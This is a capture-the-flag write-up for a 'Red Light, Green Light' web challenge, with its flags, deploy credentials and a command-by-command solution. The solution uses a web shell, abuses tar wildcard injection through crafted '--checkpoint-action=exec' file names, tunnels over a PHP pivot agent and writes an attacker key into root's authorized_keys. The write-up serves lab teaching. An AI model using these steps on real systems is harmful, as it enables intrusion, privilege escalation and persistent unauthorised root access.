# Challenge 01 - Red Light, Green Light

- Main Flag: `squid-game{BeSt34lthyW1th0utC0mm4ndEx3cUt10n}`
- Alternative Flag (in LD_PRELOAD): `squid-game{Byp4ssAllTh3Th1ngS!}`

## Description

Welcome to the first game players! This game is called **"Red Light, Green Light"**, the rules are simple:

- To win the game, you must make it to the end. The path is simple, but you'll have to sweat if you want to achieve it.
- Pay attention to the signs: your movement or not will depend on the state of the lights.
- Remember that when you move, you must do it as stealthily as possible, otherwise you will be eliminated.

To get started visit the following link:

https://challenge-01.makemalware.com

Good luck!

## Deploy

Credentials:
- root: `Squ1dG4meAdminCr3d3nt14l!`
- circle: `Squ1dG4meAdminCr3d3nt14l!`

## Solution

Solution using [Kraken](https://github.com/kraken-ng/Kraken):

```shell
sysinfo
help

# Checking we can't execute any commands because PHP Disabled Functions
help execute
execute id

# Listing disabled_functions entries
webinfo

ls /opt
cd /opt/squid-control
ls

cat squid.conf
cat green-light.sh
ls tmp

# Identify cronjob using process spy implementation
help pspy
pspy -i 1 -d 50

# Identify SSH port listening on localhost
help netstat
netstat -l

# generate SSH keys with: 
# ssh-keygen -t rsa -b 4096 -f /tmp/id_rsa

# Uploading and creating files for wildcard poisoning explotation (see script content at the end)
cd /var/www/html/files
upload /tmp/privesc.sh /var/www/html/files/privesc.sh
chmod 0777 /var/www/html/files/privesc.sh
cp /etc/issue '/var/www/html/files/--checkpoint=1'
cp /etc/issue '/var/www/html/files/--checkpoint-action=exec=sh privesc.sh'
ls

# Uploading pivotnacci PHP agent for web tunneling
upload /tmp/pivot.php /var/www/html/files/pivot.php

# Create tmux and activate pivotnacci env
./pivotnacci http://192.168.30.132/files/pivot.php --password "s3cr3t" -v
proxychains4 ssh -i /tmp/id_rsa root@127.0.0.1

# Cleaning explotation files
rm '/var/www/html/files/--checkpoint=1'
rm '/var/www/html/files/--checkpoint-action=exec=sh privesc.sh'
rm /var/www/html/files/privesc.sh
rm /var/www/html/files/pivot.php
```

Contents of **/tmp/privesc.sh** script:

```bash
#!/bin/bash

mkdir -p /root/.ssh/
echo -n "ssh-rsa AAAAB3NAACAQDACanypEyADAQABAuEAFJT+UoBSx9F8pdnYXunklbRarvRhKmHCe6BvDsndphpbMBLRlIOC9z50Yk7uLQdHqpRQVn2KBOta8MU+8DRlRVEyRHSN2R3xCC67tKaaB8PS3W+C2FTxGeNZTHWjcKC/9ilGV0wlc2IynYu/c4ZSaXxr7lp+2V5sKRYB2LxgqfkWU/Srpejir+fNqSKscLSPrXi1tGHvtc6FFts51IWIlVUONzrPdnWdRmC33qGSa+KLs3S5dVA8UH0hRcAo4OstaQf5GGG9ytGaRzA/kSQLfSzod+ex6gRXHTnk78kGKTgfkZMjWEPLYJl52DYlxsTaQ7aBGaxpAU6TMdabdpM0iWItqva4LvEtdZhwpLtWfU1zBvhnCvArXmXnvNpNAUpN2hJtlMATTLYWtZszpBdI/+vEDbm9EZjHB9e/SLCwGmFvyuuDnPdmdZlk2rmMMe1kPOGFIvkXParZVAJNaAYhso+xCLctdDO8bqynNqVwh0hhwGJ5H06eErkYGSOZxcfk/8qHXNR2/AMRjqsEVHuY69cFbuFzZcJJ35qBaxfc54q6ePX1gh9r15ZZTvM7VdJMClw==" > /root/.ssh/authorized_keys
```
